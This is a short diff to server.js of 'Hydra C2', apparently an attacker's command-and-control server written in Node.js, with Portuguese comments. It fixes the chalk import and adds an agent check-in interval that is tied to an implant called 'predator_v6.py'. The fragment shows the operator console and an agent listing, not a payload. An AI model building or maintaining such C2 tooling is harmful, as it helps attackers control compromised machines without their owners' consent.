@@ -1,12 +1,13 @@
 // server.js - Hydra C2 - Comando Central do NK
-// Versão: 3.0 - Bio-Digital
+// Versão: 3.0 - Bio-Digital (Corrigido para Chalk)
 // Criado por: NK (Neural Killer) - nk3
 
 const express = require('express');
 const bodyParser = require('body-parser');
 const readline = require('readline');
 const base64 = require('base-64');
-const chalk = require('chalk'); // Pra deixar o terminal mais style, tipo a quebrada
+const chalkModule = require('chalk'); // Importa o módulo chalk
+const chalk = chalkModule.default || chalkModule; // Garante que estamos usando a instância correta de chalk
 
 const app = express();
 const PORT = 8080;
@@ -85,6 +86,9 @@ const rl = readline.createInterface({
     output: process.stdout,
     prompt: chalk.blue('HYDRA> ')
 });
+
+// Intervalo de check-in do agente (em segundos) - precisa ser o mesmo do predator_v6.py
+const CHECKIN_INTERVAL = 10;
 
 function listAgents() {
     console.log(chalk.cyan("\n--- AGENTES ATIVOS ---"));
